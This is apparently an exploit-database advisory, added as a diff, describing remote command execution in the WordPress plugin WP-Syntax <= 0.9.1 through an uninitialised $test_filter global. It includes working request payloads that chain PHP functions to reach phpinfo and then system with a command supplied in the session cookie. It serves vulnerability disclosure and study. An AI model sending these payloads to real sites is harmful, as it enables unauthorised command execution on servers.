@@ -1,0 +1,158 @@
+============================================================
+Wordpress Plugin WP-Syntax <= 0.9.1 Remote Command Execution
+============================================================
+
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                          
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      0
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1
+
+#[+] Discovered By   : Inj3ct0r
+#[+] Site            : Inj3ct0r.com
+#[+] support e-mail  : submit[at]inj3ct0r.com
+
+
+WP-Syntax - This is the most popular plugin for wordpress to highlight
+the code. It is used on many sites, such as Stefan Esser uses it on his
+blog. For me this plugin is of interest, as found in his blog quite a
+large farm-partnerki. Following an analysis of source code, I found
+quite unusual vulnerability, therefore, decided to create a separate
+topic. Probably somebody have comments or thoughts about a more elegant
+solution.
+
+
+WP-Syntax uses the library GeSHi, which implements all the functionality
+to review the syntax and appropriate for each language html-code. Having
+reviewed the main script plugin wp-syntax.php, I moved to the folder
+test, where the 2 scripts: index.php and code.php. Code.php contains
+code examples for different languages, and leads them to the index.php
+illumination to demonstrate the capacity of the plug-in. Index.php
+inkludit wp-syntax.php, which in turn connects geshi.php. According to
+the developer wp-syntax.php can be called only in the context of WP,
+while the test / index.php can be run independently of the platform, the
+author decided to use samopalnoe WP likeness of a mechanism to implement
+the callback-function. Who is familiar with the internal device, WP, or
+at least see part of the code can understand what I am talking about
+functions add_action (), do_action (), apply_filters (), etc.
+
+
+	
+Self-f-tion apply_filters as follows:
+
+PHP code:
+
+ function apply_filters($tag, $string) 
+{ 
+    global $test_filter; 
+
+    if (!isset($test_filter[$tag])) return $string; 
+
+    uksort($test_filter[$tag], "strnatcasecmp"); 
+
+    foreach ($test_filter[$tag] as $priority => $functions) 
+    { 
+        if (is_null($functions)) continue; 
+
+        foreach($functions as $function) 
+        { 
+            $string = call_user_func_array($function, array($string)); 
+        } 
+    } 
+    return $string; 
+} 
+
+
+Global array test_filter there has not previously initialized, so you
+can add to the random elements, with register_globals = on and then
+execute any function using call_user_func_array. In WP there is a
+special t-tion - unregister_globals, protects against these
+vulnerabilities, but another case - the script works outside the context
+of WP.
+
+apply_filters called in several places, one of them:
+
+<html> 
+<head> 
+<title>WP-Syntax Test Page</title> 
+<link rel="stylesheet" href="../wp-syntax.css" type="text/css" media="screen" /> 
+<?php 
+test_head(); 
+
+/* ... */ 
+
+function test_head() 
+{ 
+  echo apply_filters("wp_head", ""); 
+} 
+?> 
+
+
+As we can see the complexity of the case is that you can not function
+with arbitrary arguments - will be transferred to an empty argument of
+type string. At first glance it seemed to me that even banal phpinfo ()
+will not be able to perform because it only takes an argument of type
+integer, or there is an error of level E_WARNING. However vniknuv the
+logic of the F-apply_filters is clear that the argument for change
+call_user_func_array () can be, because it runs in a loop and assigns
+the result of his argument for the next callback-function. In other
+words by means of a chain composed of functions could be to receive and
+transmit the -1 value in phpinfo (-1 = INFO_ALL). Then I started
+remembering all the functions of PHP, which could help me in this
+situation. As it turned out many of the functions do not take arguments,
+causing the error, if they give a blank value. Nevertheless, I need the
+sequence of function calls was found:
+
+
+http://localhost/wp/2.7/wp-content/plugins/wp-syntax/test/index.php?test_filter[wp_head][99][0]=pi&test_filter[wp_head][99][1]=cos&test_filter[wp_head][99][2]=phpinfo
+
+
+First call the function pi (), returns the value of pi. Oddly, this
+feature, despite the lack of arguments, it is an error "Wrong parameter
+count for". Then comes the call to the function cos (), which is passed
+the value of pi. As you know, cos (pi) = -1, so in the phpinfo ()
+reaches the desired value and output data.
+
+It seemed no longer to achieve, but I continue to seek ways to perform
+arbitrary commands. It was necessary to find a function that returns
+would be needed for my data. These data could be obtained from the
+environment, but do not reach appropriate functions. However, the way
+all the same was found =)
+
+
+PHP code:
+
+<?php 
+session_start(""); 
+echo session_id(); 
+echo session_id(""); 
+echo session_id(); 
+?>
+
+
+It was found that the session_id returns last ID, despite the fact that
+the function was transferred to the parameter. I do not know this bug or
+not, but at the docks on that occasion said nothing. As a result, the
+final query looks as follows:
+F-tion session_id () can return a value as the current session ID, and
+install it, if there was any argument. I obviously need to get value,
+but how to deal with an empty parameter, which is constantly being
+passed? I decided to check the return value of this script:
+
+GET /wp/2.7/wp-content/plugins/wp-syntax/test/index.php?test_filter[wp_head][99][0]=session_start&test_filter[wp_head][99][1]=session_id&test_filter[wp_head][99][2]=system HTTP/1.0
+Host: localhost
+Cookie: PHPSESSID=dir
+Connection: close
+
+
+# ~  - [ [ : Inj3ct0r : ] ]
+
+# milw0rm.com [2009-08-13]
